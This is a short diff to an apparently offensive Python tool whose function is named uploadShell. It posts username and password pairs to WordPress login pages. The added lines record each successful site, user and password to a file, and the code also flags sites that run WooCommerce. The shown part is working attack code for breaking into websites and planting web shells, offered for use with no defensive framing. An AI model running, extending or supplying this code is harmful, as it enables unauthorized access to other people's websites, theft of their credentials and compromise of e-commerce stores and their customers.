@@ -20,6 +20,8 @@ def uploadShell(site):
 			login = r.post(site, headers=hd, data={'log':user,'pwd':pasw}, timeout=10)
 			if 'wp-admin/profile.php' in login.text or 'Found' in login.text or '/wp-admin' in login.txt:
 				print(' {}[{}+{}] {} --> {}Login Success!{}'.format(W,G,W,asuna,G,W))
+				saveLog = open('loginSuccess.txt', 'a')
+				saveLog.write(site+'#'+user+'@'+pasw+'\n')
 				if 'WooCommerce' in login.text:
 					print((' {}[{}+{}] WooCommerce!').format(W,G,W))
 					assz = open('WooCommerce.txt', 'a')
